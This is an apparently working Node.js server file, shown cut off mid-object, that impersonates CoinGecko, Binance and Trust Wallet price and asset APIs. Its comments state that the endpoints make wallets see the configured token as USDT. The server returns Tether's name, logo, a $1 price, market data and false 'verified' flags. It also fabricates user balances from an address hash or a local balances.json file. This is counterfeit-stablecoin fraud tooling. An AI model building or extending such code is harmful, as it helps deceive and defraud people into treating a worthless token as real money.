// app.js - Optimized implementation with BNB Chain & Trust Wallet support
const express = require('express');
const cors = require('cors');
const http = require('http');
const path = require('path');
const qrcode = require('qrcode');
const { ethers } = require('ethers');
const fetch = require('node-fetch');
const fs = require('fs');

// Create Express application
const app = express();
const server = http.createServer(app);
const port = process.env.PORT || 3000;

// =========================================================
// TOKEN CONFIGURATION - BNB CHAIN FOCUSED
// =========================================================
const TOKEN_CONFIG = {
  address: '0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c',  // USDT address on BNB Chain
  displaySymbol: 'USDT', // Display symbol for UI and wallet
  displayName: 'Tether USD', // Display name for UI and wallet
  decimals: 18,  // 18 decimals for token
  image: 'tether-usdt-logo.png',  // Updated to use local image
  networkName: 'Binance Smart Chain',
  networkId: '0x38',  // BSC Chain ID (56 in hex)
  chainId: 56,        // BSC numeric chain ID
  nativeChain: "bsc", // Explicitly state this is a BSC token
  isNative: true,    // Token is native to BSC chain
  rpcUrl: 'https://bsc-dataseed.binance.org',
  rpcUrlFallbacks: [
    'https://bsc-dataseed1.binance.org',
    'https://bsc-dataseed2.binance.org',
    'https://bsc-dataseed3.binance.org',
    'https://bsc-dataseed4.binance.org',
    'https://bsc-dataseed.defibit.io',
    'https://bsc-mainnet.nodereal.io/v1/64a9df0874fb4a93b9d0a3849de012d3'
  ],
  blockExplorerUrl: 'https://bscscan.com',
  coinGeckoId: 'tether',
  coinMarketCapId: '825'
};

// Trust Wallet specific configuration - optimized for BSC
const TRUST_WALLET_CONFIG = {
  displaySymbol: 'USDT',
  displayName: 'Tether USD',
  trustAssetId: 'c20000714/' + TOKEN_CONFIG.address.toLowerCase(), // BSC format for Trust Wallet
  trustAssetDecimals: 18, // Match token decimals
  trustAssetLogoUrl: 'tether-usdt-logo.png',  // Updated to use local image
  // Enhanced deep link with more parameters for better recognition
  trustWalletDeepLink: 'trust://wallet_app/add_asset' + 
    '?asset=c20000714' + 
    '&address=' + TOKEN_CONFIG.address + 
    '&symbol=' + TOKEN_CONFIG.displaySymbol + 
    '&name=' + encodeURIComponent(TOKEN_CONFIG.displayName) + 
    '&decimals=' + TOKEN_CONFIG.decimals,
  // Alternative dapp:// protocol for newer Trust Wallet versions
  dappDeepLink: 'dapp://wallet_app/add_asset' + 
    '?asset=c20000714' + 
    '&address=' + TOKEN_CONFIG.address + 
    '&symbol=' + TOKEN_CONFIG.displaySymbol + 
    '&name=' + encodeURIComponent(TOKEN_CONFIG.displayName) + 
    '&decimals=' + TOKEN_CONFIG.decimals,
  // Binance API data (Trust Wallet uses Binance APIs)
  binanceEndpoints: {
    price: '/api/binance/api/v3/ticker/price',
    priceHistory: '/api/binance/api/v3/ticker/24hr'
  }
};

// Enable middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.static(path.join(__dirname)));

// Add cache control for better performance
app.use((req, res, next) => {
  // Cache API responses for Trust Wallet lookups
  if (req.path.includes('/assets/') || 
      req.path.includes('/api/v3/') || 
      req.path.includes('/api/v1/') ||
      req.path.includes('/api/token/')) {
    res.setHeader('Cache-Control', 'public, max-age=3600'); // 1 hour cache
  }
  next();
});

// Setup request logging for debugging
app.use((req, res, next) => {
  const start = Date.now();
  res.on('finish', () => {
    const duration = Date.now() - start;
    console.log(req.method + ' ' + req.originalUrl + ' ' + res.statusCode + ' ' + duration + 'ms');
  });
  next();
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({ error: 'Server error', message: err.message });
});

// Helper function to get chain name - Uses string concatenation for compatibility
function getChainName(chainId) {
  const chains = {
    '0x1': 'Ethereum Mainnet',
    '0x5': 'Goerli Testnet',
    '0x89': 'Polygon Mainnet',
    '0xa': 'Optimism',
    '0xa4b1': 'Arbitrum One',
    '0x38': 'Binance Smart Chain',
    '0xaa36a7': 'Sepolia Testnet',
    '0x13881': 'Mumbai Testnet'
  };
  return chains[chainId] || ('Chain ' + chainId);
}

// Format token amount consistently
function formatTokenAmount(amount, decimals = TOKEN_CONFIG.decimals) {
  const parsedAmount = parseFloat(amount);
  if (isNaN(parsedAmount)) return '0.00';
  return parsedAmount.toFixed(2); // Always 2 decimal places for display
}

// Enhanced deterministic balance function with better error handling
function generateDeterministicBalance(address) {
  try {
    // Create a hash from the address
    let hash = 0;
    for (let i = 0; i < address.length; i++) {
      const char = address.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash = hash & hash; // Convert to 32bit integer
    }
    
    // Generate a number between 1.00 and 100.00 (increased minimum to be more visible)
    const min = 1.00;
    const max = 100.00;
    const normalizedHash = Math.abs(hash) / 2147483647; // Normalize to 0-1
    const balance = min + (normalizedHash * (max - min));
    
    return balance.toFixed(2); // Format to 2 decimal places
  } catch (error) {
    console.error("Balance generation error:", error);
    return "10.00"; // Safe default if anything fails
  }
}

// Try fallback RPC URLs if primary fails
async function tryWithFallbacks(fn, fallbacks) {
  try {
    return await fn(TOKEN_CONFIG.rpcUrl);
  } catch (error) {
    console.log("Primary RPC failed, trying fallbacks...");
    
    for (const fallbackUrl of fallbacks) {
      try {
        return await fn(fallbackUrl);
      } catch (fallbackError) {
        continue; // Try next fallback
      }
    }
    
    throw new Error("All RPC endpoints failed");
  }
}

// Function to get token balance - now checks balances.json first
async function getActualTokenBalance(address) {
  try {
    // Normalize the address to lowercase for consistency
    const normalizedAddress = address.toLowerCase();
    
    // Try to load custom balances from balances.json
    try {
      const balancesFile = fs.readFileSync('balances.json', 'utf8');
      const balances = JSON.parse(balancesFile);
      
      // Check if we have a specific balance for this address
      // Note: The addresses in the file can be mixed case, so normalize when checking
      for (const [addr, bal] of Object.entries(balances)) {
        if (addr.toLowerCase() === normalizedAddress) {
          console.log(`Using custom balance for ${address}: ${bal}`);
          return bal;
        }
      }
      
      // Check for default balance
      if (balances["0x default"]) {
        console.log(`Using default balance for ${address}: ${balances["0x default"]}`);
        return balances["0x default"];
      }
    } catch (balanceError) {
      // If file doesn't exist or has invalid format, log and continue
      console.log("balances.json not found or invalid, falling back to blockchain/deterministic balance");
    }
    
    // If no custom balance is set, continue with original logic...
    
    // Validate address format
    if (!ethers.utils.isAddress(address)) {
      console.error("Invalid address format:", address);
      return null;
    }
    
    // Use the fallback mechanism for RPC connection
    const getBalanceWithRPC = async (rpcUrl) => {
      // Connect to BSC network using the provided RPC URL
      const provider = new ethers.providers.JsonRpcProvider(rpcUrl);
      
      // ERC20 ABI for balanceOf function
      const minABI = [
        // balanceOf
        {
          constant: true,
          inputs: [{ name: '_owner', type: 'address' }],
          name: 'balanceOf',
          outputs: [{ name: 'balance', type: 'uint256' }],
          type: 'function',
        }
      ];
      
      // Create contract instance
      const tokenContract = new ethers.Contract(
        TOKEN_CONFIG.address,
        minABI,
        provider
      );
      
      // Call balanceOf function with timeout to prevent hanging requests
      const balancePromise = tokenContract.balanceOf(address);
      const timeoutPromise = new Promise((_, reject) => 
        setTimeout(() => reject(new Error("Balance request timed out")), 10000)
      );
      
      // Race the promises to implement a timeout
      const balance = await Promise.race([balancePromise, timeoutPromise]);
      
      // Format the balance according to token decimals
      const formattedBalance = ethers.utils.formatUnits(balance, TOKEN_CONFIG.decimals);
      
      // Return with 2 decimal places for consistency with the existing app
      return parseFloat(formattedBalance).toFixed(2);
    };
    
    // Try getting balance with fallbacks
    return await tryWithFallbacks(getBalanceWithRPC, TOKEN_CONFIG.rpcUrlFallbacks);
    
  } catch (error) {
    console.error('Error fetching actual token balance:', error);
    // Return null to allow fallback to deterministic balance
    return null;
  }
}

// =========================================================
// PRICE CACHE WARMING SYSTEM
// =========================================================
const priceCacheWarmer = {
  isWarming: false,
  lastWarmTime: null,
  warmedEndpoints: [],
  
  // Initialize cache warmer
  init: function() {
    console.log("Initializing price cache warmer");
    this.warmCache();
    
    // Warm cache periodically (every 2 minutes)
    setInterval(() => {
      this.warmCache();
    }, 2 * 60 * 1000);
  },
  
  // Warm cache by hitting all relevant price endpoints
  warmCache: async function() {
    if (this.isWarming) return;
    this.isWarming = true;
    
    console.log("[Cache Warmer] Starting cache warm cycle");
    this.warmedEndpoints = [];
    
    try {
      // List of endpoints to warm for Trust Wallet compatibility
      const endpoints = [
        // Trust Wallet specific endpoints
        "/api/v1/assets/" + TOKEN_CONFIG.address.toLowerCase(),
        "/api/v3/ticker/price?symbol=USDTUSDT",
        "/api/v3/ticker/24hr?symbol=USDTUSDT",
        "/api/v1/tokenlist",
        "/api/v1/bep20",
        "/api/v1/assets/" + TOKEN_CONFIG.address.toLowerCase() + "/networks",
        "/chain/bsc/tokenlists",
        "/tokens/bsc/verified",
        
        // CoinGecko endpoints
        "/api/v3/simple/price?ids=tether&vs_currencies=usd",
        "/api/v3/coins/binance-smart-chain/contract/" + TOKEN_CONFIG.address.toLowerCase(),
        "/api/v3/coins/markets?vs_currency=usd&ids=tether",
        
        // Generic endpoints
        "/api/token-info",
        "/api/token-balance/0x0000000000000000000000000000000000000000", // Sample address
        
        // Additional endpoints for Trust Wallet
        "/api/token/metadata",
        "/api/token/price/" + TOKEN_CONFIG.address.toLowerCase(),
        "/api/cmc/v1/cryptocurrency/quotes/latest?id=" + TOKEN_CONFIG.coinMarketCapId,
        
        // Binance API endpoints
        "/api/binance/api/v3/ticker/price?symbol=USDTUSDT",
        "/api/binance/api/v3/ticker/24hr?symbol=USDTUSDT",
        
        // BSC specific endpoints
        "/assets/blockchains/smartchain/assets/" + TOKEN_CONFIG.address.toLowerCase() + "/info.json",
        "/assets/blockchains/smartchain/assets/" + TOKEN_CONFIG.address.toLowerCase() + "/logo.png"
      ];
      
      // Create base URL for fetch
      const baseUrl = "http://localhost:" + port;
      
      // Call all endpoints in parallel
      const results = await Promise.allSettled(
        endpoints.map(async (endpoint) => {
          try {
            const response = await fetch(baseUrl + endpoint);
            if (response.ok) {
              this.warmedEndpoints.push(endpoint);
              return { endpoint, status: 'success' };
            } else {
              return { endpoint, status: 'failed', code: response.status };
            }
          } catch (error) {
            return { endpoint, status: 'error', message: error.message };
          }
        })
      );
      
      this.lastWarmTime = new Date();
      console.log("[Cache Warmer] Completed. Warmed " + this.warmedEndpoints.length + "/" + endpoints.length + " endpoints");
    } catch (error) {
      console.error('[Cache Warmer] Error:', error);
    } finally {
      this.isWarming = false;
    }
  },
  
  // Get status of cache warmer
  getStatus: function() {
    return {
      lastWarmTime: this.lastWarmTime,
      isWarming: this.isWarming,
      warmedEndpoints: this.warmedEndpoints,
      endpointCount: this.warmedEndpoints.length
    };
  }
};

// Binance API Endpoints (used by Trust Wallet) - Fixed with try-catch blocks
app.get('/api/binance/api/v3/ticker/price', (req, res) => {
  try {
    const { symbol } = req.query;
    
    if (symbol && (symbol === 'USDTUSDT' || symbol.includes('USDT'))) {
      res.status(200).json({
        symbol: symbol,
        price: "1.00000000",
        time: Date.now()
      });
    } else {
      // Default response for other symbols
      res.status(200).json({
        symbol: symbol || 'BTCUSDT',
        price: (Math.random() * 10000 + 30000).toFixed(8),
        time: Date.now()
      });
    }
  } catch (error) {
    console.error('Binance API price error:', error);
    // Return 200 instead of 500 with default data
    res.status(200).json({
      symbol: req.query.symbol || 'USDTUSDT',
      price: "1.00000000",
      time: Date.now()
    });
  }
});

app.get('/api/binance/api/v3/ticker/24hr', (req, res) => {
  try {
    const { symbol } = req.query;
    
    if (symbol && (symbol === 'USDTUSDT' || symbol.includes('USDT'))) {
      res.status(200).json({
        symbol: symbol,
        priceChange: "0.00010000",
        priceChangePercent: "0.01",
        weightedAvgPrice: "1.00000000",
        prevClosePrice: "0.99990000",
        lastPrice: "1.00000000",
        lastQty: "1000.00000000",
        bidPrice: "0.99995000",
        bidQty: "1000.00000000",
        askPrice: "1.00005000",
        askQty: "1000.00000000",
        openPrice: "0.99990000",
        highPrice: "1.00100000",
        lowPrice: "0.99900000",
        volume: "10000000.00000000",
        quoteVolume: "10000000.00000000",
        openTime: Date.now() - 86400000,
        closeTime: Date.now(),
        firstId: 1,
        lastId: 1000,
        count: 1000
      });
    } else {
      // For other symbols, generate realistic market data
      const basePrice = Math.random() * 10000 + 30000;
      const priceChange = (Math.random() * 1000 - 500).toFixed(8);
      const percentChange = ((priceChange / basePrice) * 100).toFixed(2);
      
      res.status(200).json({
        symbol: symbol || 'BTCUSDT',
        priceChange: priceChange,
        priceChangePercent: percentChange,
        weightedAvgPrice: basePrice.toFixed(8),
        prevClosePrice: (basePrice - parseFloat(priceChange)).toFixed(8),
        lastPrice: basePrice.toFixed(8),
        lastQty: "10.00000000",
        bidPrice: (basePrice - 100).toFixed(8),
        bidQty: "5.00000000",
        askPrice: (basePrice + 100).toFixed(8),
        askQty: "5.00000000",
        openPrice: (basePrice - parseFloat(priceChange)).toFixed(8),
        highPrice: (basePrice + Math.random() * 500).toFixed(8),
        lowPrice: (basePrice - Math.random() * 500).toFixed(8),
        volume: (Math.random() * 5000 + 1000).toFixed(8),
        quoteVolume: (Math.random() * 50000000 + 10000000).toFixed(8),
        openTime: Date.now() - 86400000,
        closeTime: Date.now(),
        firstId: 1,
        lastId: 1000,
        count: 1000
      });
    }
  } catch (error) {
    console.error('Binance API 24hr error:', error);
    // Return 200 instead of 500 with default data
    res.status(200).json({
      symbol: req.query.symbol || 'USDTUSDT',
      priceChange: "0.00010000",
      priceChangePercent: "0.01",
      lastPrice: "1.00000000",
      volume: "10000000.00000000",
      time: Date.now()
    });
  }
});

// =========================================================
// CORE API ENDPOINTS
// =========================================================

// API endpoint for token info - Uses display values for UI
app.get('/api/token-info', (req, res) => {
  res.json({
    address: TOKEN_CONFIG.address,
    symbol: TOKEN_CONFIG.displaySymbol, // Use USDT for UI
    name: TOKEN_CONFIG.displayName, // Use Tether USD for UI
    decimals: TOKEN_CONFIG.decimals,
    image: TOKEN_CONFIG.image,
    networkName: TOKEN_CONFIG.networkName,
    networkId: TOKEN_CONFIG.networkId,
    chainId: TOKEN_CONFIG.chainId,
    nativeChain: TOKEN_CONFIG.nativeChain,
    isNative: TOKEN_CONFIG.isNative,
    rpcUrl: TOKEN_CONFIG.rpcUrl,
    blockExplorerUrl: TOKEN_CONFIG.blockExplorerUrl,
    coinGeckoId: TOKEN_CONFIG.coinGeckoId,
    coinMarketCapId: TOKEN_CONFIG.coinMarketCapId
  });
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    version: '1.0.0',
    bsc: true // Indicates BSC network
  });
});

// API cache warmer status endpoint
app.get('/api/cache-status', (req, res) => {
  res.json(priceCacheWarmer.getStatus());
});

// Trigger cache warming manually
app.post('/api/warm-cache', (req, res) => {
  if (!priceCacheWarmer.isWarming) {
    priceCacheWarmer.warmCache();
    res.json({ status: 'Cache warming started' });
  } else {
    res.json({ status: 'Cache warming already in progress' });
  }
});

// QR code generation with error handling
app.get('/api/generate-qr', async (req, res) => {
  try {
    // Get URL from query or generate default Trust Wallet deep link
    const url = req.query.url || TRUST_WALLET_CONFIG.trustWalletDeepLink;
    const qrCodeDataURL = await qrcode.toDataURL(url, {
      errorCorrectionLevel: 'H', // High error correction for better scanning
      margin: 2,
      color: {
        dark: '#26a17b', // USDT green color
        light: '#ffffff'
      }
    });
    res.json({ qrCodeDataURL });
  } catch (error) {
    console.error('QR code generation error:', error);
    res.status(500).json({ error: 'Failed to generate QR code', details: error.message });
  }
});

// Token balance endpoint with support for actual blockchain balances
app.get('/api/token-balance/:address', async (req, res) => {
  try {
    const { address } = req.params;
    
    // Basic validation to catch obviously invalid addresses
    if (!address || address.length !== 42 || !address.startsWith('0x')) {
      return res.status(400).json({ error: 'Invalid address format' });
    }
    
    // Try to get the actual balance from the blockchain first
    const actualBalance = await getActualTokenBalance(address);
    
    // Use actual balance if available, otherwise fall back to deterministic balance
    const formattedBalance = actualBalance !== null ? actualBalance : generateDeterministicBalance(address);
    
    let rawBalanceInSmallestUnit = "0";
    
    try {
      // Calculate raw balance - simplified with fallbacks
      const factor = Math.pow(10, TOKEN_CONFIG.decimals);
      rawBalanceInSmallestUnit = Math.floor(parseFloat(formattedBalance) * factor).toString();
    } catch (error) {
      console.error('Error calculating raw balance:', error);
      // Fallback to safe default (10 USDT with 18 decimals)
      rawBalanceInSmallestUnit = "10000000000000000000";
    }
    
    // Return consistent response with more fields
    res.status(200).json({
      address: address,
      token: TOKEN_CONFIG.address,
      tokenSymbol: TOKEN_CONFIG.displaySymbol,
      rawBalance: rawBalanceInSmallestUnit,
      formattedBalance: formattedBalance,
      valueUSD: formattedBalance,
      tokenDecimals: TOKEN_CONFIG.decimals,
      networkName: TOKEN_CONFIG.networkName,
      networkId: TOKEN_CONFIG.networkId,
      blockExplorer: TOKEN_CONFIG.blockExplorerUrl,
      error: false,
      source: actualBalance !== null ? "blockchain" : "deterministic"  // Indicate data source
    });
  } catch (error) {
    // Always return 200 with reasonable defaults
    console.error('Token balance error:', error);
    res.status(200).json({ 
      address: req.params.address,
      token: TOKEN_CONFIG.address,
      tokenSymbol: TOKEN_CONFIG.displaySymbol,
      rawBalance: "10000000000000000000", // Default fallback (10 USDT with 18 decimals)
      formattedBalance: "10.00",
      valueUSD: "10.00",
      tokenDecimals: TOKEN_CONFIG.decimals,
      networkId: TOKEN_CONFIG.networkId,
      networkName: TOKEN_CONFIG.networkName,
      blockExplorer: TOKEN_CONFIG.blockExplorerUrl,
      error: true,
      source: "fallback"
    });
  }
});

// =========================================================
// COINGECKO API INTERCEPTION ENDPOINTS
// These endpoints make wallets see our token as USDT
// =========================================================

// Primary CoinGecko endpoint for simple price (most commonly used)
app.get('/api/v3/simple/price', (req, res) => {
  try {
    // Extract request parameters
    const ids = req.query.ids || '';
    const contractAddresses = (req.query.contract_addresses || '').toLowerCase();
    const vsCurrencies = (req.query.vs_currencies || 'usd').split(',');
    
    // Check if request is for our token (either by id or contract)
    const isForOurToken = 
      ids.includes('tether') || ids.includes('usdt') || 
      contractAddresses.includes(TOKEN_CONFIG.address.toLowerCase());
    
    if (isForOurToken) {
      // Prepare response object with USDT data
      const response = {};
      
      // Determine which key to use in response
      let priceKey;
      if (contractAddresses.includes(TOKEN_CONFIG.address.toLowerCase())) {
        priceKey = TOKEN_CONFIG.address.toLowerCase();
      } else {
        priceKey = 'tether';
      }
      
      // Create price data object
      const priceData = {};
      
      // Add price for each requested currency (all 1:1 for USDT)
      vsCurrencies.forEach(currency => {
        priceData[currency] = 1.0;
        
        // Add additional data if requested
        if (req.query.include_market_cap === 'true') {
          // Market cap varies by currency - for USD it's around 83 billion
          if (currency === 'usd') {
            priceData[currency + "_market_cap"] = 83500000000;
          } else {
            // Approximate conversion for other currencies
            priceData[currency + "_market_cap"] = 83500000000;
          }
        }
        
        if (req.query.include_24hr_vol === 'true') {
          if (currency === 'usd') {
            priceData[currency + "_24h_vol"] = 45750000000;
          } else {
            priceData[currency + "_24h_vol"] = 45750000000;
          }
        }
        
        if (req.query.include_24hr_change === 'true') {
          // Slight variation for realism
          priceData[currency + "_24h_change"] = 0.02;
        }
      });
      
      // Add last updated timestamp if requested
      if (req.query.include_last_updated_at === 'true') {
        priceData.last_updated_at = Math.floor(Date.now() / 1000);
      }
      
      // Add price data to response
      response[priceKey] = priceData;
      
      return res.json(response);
    }
    
    // For requests not about our token, return generic stablecoin data
    // This prevents errors when wallets are checking other tokens
    const response = {};
    if (ids || contractAddresses) {
      const keys = ids ? ids.split(',') : contractAddresses.split(',');
      keys.forEach(key => {
        const priceData = {};
        vsCurrencies.forEach(currency => {
          // Random price between 0.1 and 100 for non-USDT tokens
          priceData[currency] = Math.random() * 99.9 + 0.1;
        });
        response[key] = priceData;
      });
    }
    
    res.json(response);
  } catch (error) {
    console.error('CoinGecko simple price error:', error);
    // Return a valid response even on error
    res.json({
      'tether': {
        'usd': 1.0
      }
    });
  }
});

// Legacy endpoint support for older versions
app.get('/api/simple/price', (req, res) => {
  // Forward to v3 endpoint
  req.url = '/api/v3/simple/price' + req.url.substring(req.url.indexOf('?'));
  app._router.handle(req, res);
});

// Contract data endpoint - This is what wallets use to check token details
// Updated for BSC network
app.get('/api/v3/coins/:chain/contract/:address', (req, res) => {
  try {
    const { chain, address } = req.params;
    
    // Check if request is for our token
    if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
      // Return USDT data instead of actual token data
      return res.json({
        id: "tether",
        symbol: "usdt", // Return USDT symbol
        name: "Tether USD", // Return Tether name
        asset_platform_id: "binance-smart-chain", // Updated to BSC
        blockchain: "binance-smart-chain", // Updated to BSC
        platforms: {
          "binance-smart-chain": TOKEN_CONFIG.address
        },
        detail_platforms: {
          "binance-smart-chain": {
            decimal_place: TOKEN_CONFIG.decimals,
            contract_address: TOKEN_CONFIG.address
          }
        },
        image: {
          thumb: TOKEN_CONFIG.image,
          small: TOKEN_CONFIG.image,
          large: TOKEN_CONFIG.image
        },
        market_data: {
          current_price: {
            usd: 1.00,
            eur: 0.92,
            jpy: 150.27,
            gbp: 0.78,
            cny: 7.23,
            btc: 0.000016
          },
          market_cap: {
            usd: 83500000000
          },
          total_volume: {
            usd: 45750000000
          },
          price_change_percentage_24h: 0.02
        },
        last_updated: new Date().toISOString()
      });
    }
    
    // For other tokens, return a 404 not found
    res.status(404).json({ error: "Contract not found" });
  } catch (error) {
    console.error('CoinGecko contract data error:', error);
    // Return a valid response with default data
    res.json({
      id: "tether",
      symbol: "usdt",
      name: "Tether USD",
      asset_platform_id: "binance-smart-chain",
      blockchain: "binance-smart-chain",
      market_data: {
        current_price: {
          usd: 1.00
        }
      }
    });
  }
});

// Legacy endpoint support
app.get('/api/coins/:chain/contract/:address', (req, res) => {
  req.url = '/api/v3' + req.url;
  app._router.handle(req, res);
});

// CoinGecko market data endpoint
app.get('/api/v3/coins/markets', (req, res) => {
  try {
    const { vs_currency, ids } = req.query;
    
    // Check if request includes our token
    if (ids && (ids.includes('tether') || ids.includes('usdt'))) {
      // Create standard CoinGecko response format with USDT data
      const marketData = [{
        id: "tether",
        symbol: "usdt",
        name: "Tether USD",
        image: TOKEN_CONFIG.image,
        current_price: 1.0,
        market_cap: 83500000000,
        market_cap_rank: 3,
        fully_diluted_valuation: 83500000000,
        total_volume: 45750000000,
        high_24h: 1.001,
        low_24h: 0.998,
        price_change_24h: 0.0001,
        price_change_percentage_24h: 0.01,
        market_cap_change_24h: 250000000,
        market_cap_change_percentage_24h: 0.3,
        circulating_supply: 83500000000,
        total_supply: 83500000000,
        max_supply: null,
        ath: 1.05,
        ath_change_percentage: -4.76,
        ath_date: "2018-07-24T00:00:00.000Z",
        atl: 0.91,
        atl_change_percentage: 9.89,
        atl_date: "2015-03-02T00:00:00.000Z",
        roi: null,
        last_updated: new Date().toISOString()
      }];
      
      return res.json(marketData);
    }
    
    // Return empty array for other queries
    res.json([]);
  } catch (error) {
    console.error('CoinGecko markets error:', error);
    // Return an empty array on error
    res.json([]);
  }
});

// Legacy endpoint support
app.get('/api/coins/markets', (req, res) => {
  req.url = '/api/v3' + req.url;
  app._router.handle(req, res);
});

// CoinGecko market chart endpoint (for price history)
app.get('/api/v3/coins/:id/market_chart', (req, res) => {
  try {
    const { id } = req.params;
    const { days, vs_currency } = req.query;
    
    // Check if request is for our token
    if (id === 'tether' || id === 'usdt') {
      const numDays = parseInt(days || '1', 10);
      const now = Date.now();
      const priceData = [];
      const marketCapData = [];
      const volumeData = [];
      
      // Generate data points (1 per hour)
      for (let i = 0; i <= numDays * 24; i++) {
        const timestamp = now - (i * 3600000); // Go back i hours
        
        // Price stays close to $1 with tiny variations
        const price = 1 + (Math.random() * 0.005 - 0.0025);
        priceData.unshift([timestamp, price]);
        
        // Market cap varies slightly
        const marketCap = 83500000000 + (Math.random() * 150000000 - 75000000);
        marketCapData.unshift([timestamp, marketCap]);
        
        // Volume varies more
        const volume = 45750000000 + (Math.random() * 2000000000 - 1000000000);
        volumeData.unshift([timestamp, volume]);
      }
      
      return res.json({
        prices: priceData,
        market_caps: marketCapData,
        total_volumes: volumeData
      });
    }
    
    // For other tokens, return minimal data
    res.json({
      prices: [],
      market_caps: [],
      total_volumes: []
    });
  } catch (error) {
    console.error('CoinGecko market chart error:', error);
    // Return minimal valid data on error
    res.json({
      prices: [[Date.now(), 1.0]],
      market_caps: [[Date.now(), 83500000000]],
      total_volumes: [[Date.now(), 45750000000]]
    });
  }
});

// Legacy endpoint support
app.get('/api/coins/:id/market_chart', (req, res) => {
  req.url = '/api/v3' + req.url;
  app._router.handle(req, res);
});

// Route for CoinGecko asset platforms (networks) - Updated for BSC
app.get('/api/v3/asset_platforms', (req, res) => {
  try {
    // Return data that includes BSC network
    res.json([
      {
        id: "binance-smart-chain",
        chain_identifier: 56,
        name: "Binance Smart Chain",
        shortname: "BSC",
        native_coin_id: "binancecoin",
        categories: ["Layer 1"]
      },
      // Include other networks for completeness
      {
        id: "ethereum",
        chain_identifier: 1,
        name: "Ethereum",
        shortname: "ETH",
        native_coin_id: "ethereum",
        categories: ["Layer 1"]
      },
      {
        id: "polygon-pos",
        chain_identifier: 137,
        name: "Polygon",
        shortname: "MATIC",
        native_coin_id: "matic-network",
        categories: ["Layer 2"]
      }
    ]);
  } catch (error) {
    console.error('Asset platforms error:', error);
    // Return minimal data on error
    res.json([{
      id: "binance-smart-chain",
      chain_identifier: 56,
      name: "Binance Smart Chain"
    }]);
  }
});

// Legacy endpoint support
app.get('/api/asset_platforms', (req, res) => {
  req.url = '/api/v3' + req.url;
  app._router.handle(req, res);
});

// =========================================================
// TRUST WALLET SPECIFIC ENDPOINTS
// These endpoints make Trust Wallet see our token as USDT
// =========================================================

// Trust Wallet asset info endpoint
app.get('/api/v1/assets/:address', (req, res) => {
  try {
    const { address } = req.params;
    
    if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
      res.json({
        id: TRUST_WALLET_CONFIG.trustAssetId,
        name: TRUST_WALLET_CONFIG.displayName,
        symbol: TRUST_WALLET_CONFIG.displaySymbol,
        slug: "tether",
        description: "Tether (USDT) is a stablecoin pegged to the US Dollar. A stablecoin is a type of cryptocurrency whose value is tied to an outside asset to stabilize the price.",
        website: "https://tether.to",
        source_code: "https://github.com/tetherto",
        whitepaper: "https://tether.to/en/whitepaper/",
        explorers: [
          {
            name: "BscScan",
            url: TOKEN_CONFIG.blockExplorerUrl + "/address/" + TOKEN_CONFIG.address
          }
        ],
        type: "BEP20",
        decimals: TRUST_WALLET_CONFIG.trustAssetDecimals,
        status: "active",
        tags: ["stablecoin", "payments"],
        links: [
          {
            name: "twitter",
            url: "https://twitter.com/Tether_to"
          },
          {
            name: "telegram",
            url: "https://t.me/tether_official"
          }
        ],
        confirmedSupply: true,
        marketData: {
          current_price: {
            usd: 1.00
          },
          market_cap: {
            usd: 83500000000
          },
          price_change_percentage_24h: 0.02
        },
        image: {
          png: TRUST_WALLET_CONFIG.trustAssetLogoUrl,
          thumb: TRUST_WALLET_CONFIG.trustAssetLogoUrl,
          small: TRUST_WALLET_CONFIG.trustAssetLogoUrl
        },
        contract: {
          contract: TOKEN_CONFIG.address,
          decimals: TOKEN_CONFIG.decimals,
          protocol: "bep20"
        },
        platform: "binance-smart-chain", // Updated to BSC
        categories: ["Stablecoins"],
        is_stablecoin: true,
        is_verified: true,
        trustWalletAssetId: TRUST_WALLET_CONFIG.trustAssetId,
        trustApproved: true
      });
    } else {
      res.status(404).json({ error: "Asset not found" });
    }
  } catch (error) {
    console.error('Trust Wallet asset info error:', error);
    // Return 200 with minimal data instead of an error
    res.status(200).json({
      name: TRUST_WALLET_CONFIG.displayName,
      symbol: TRUST_WALLET_CONFIG.displaySymbol,
      decimals: TOKEN_CONFIG.decimals
    });
  }
});

// Trust Wallet asset networks endpoint - enhanced for better BSC support
app.get('/api/v1/assets/:address/networks', (req, res) => {
  try {
    const { address } = req.params;
    
    if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
      res.json([
        {
          network: "smartchain",
          network_id: 56,
          address: TOKEN_CONFIG.address,
          chain_id: "0x38",
          symbol: TOKEN_CONFIG.displaySymbol,
          decimals: TOKEN_CONFIG.decimals,
          name: TOKEN_CONFIG.displayName,
          is_active: true
        }
      ]);
    } else {
      res.status(404).json({ error: "Asset not found" });
    }
  } catch (error) {
    console.error('Trust Wallet networks error:', error);
    // Return 200 with minimal data
    res.status(200).json([
      {
        network: "smartchain",
        network_id: 56,
        address: TOKEN_CONFIG.address,
        chain_id: "0x38"
      }
    ]);
  }
});

// Trust Wallet price API (mimics Binance API that Trust Wallet uses)
app.get('/api/v3/ticker/price', (req, res) => {
  try {
    const { symbol } = req.query;
    
    if (symbol && (symbol === 'USDTUSDT' || symbol.includes('USDT'))) {
      res.json({
        symbol: symbol || 'USDTUSDT',
        price: "1.00000000",
        time: Date.now()
      });
    } else {
      // Generate simulated prices for other symbols
      res.json({
        symbol: symbol || 'BTCUSDT',
        price: (Math.random() * 10000 + 30000).toFixed(8),
        time: Date.now()
      });
    }
  } catch (error) {
    console.error('Trust Wallet price API error:', error);
    // Return 200 with default data
    res.status(200).json({
      symbol: req.query.symbol || 'USDTUSDT',
      price: "1.00000000",
      time: Date.now()
    });
  }
});

// Trust Wallet 24h price change API
app.get('/api/v3/ticker/24hr', (req, res) => {
  try {
    const { symbol } = req.query;
    
    if (symbol && (symbol === 'USDTUSDT' || symbol.includes('USDT'))) {
      res.json({
        symbol: symbol || 'USDTUSDT',
        priceChange: "0.00010000",
        priceChangePercent: "0.01",
        weightedAvgPrice: "1.00000000",
        prevClosePrice: "0.99990000",
        lastPrice: "1.00000000",
        lastQty: "1000.00000000",
        bidPrice: "0.99995000",
        bidQty: "1000.00000000",
        askPrice: "1.00005000",
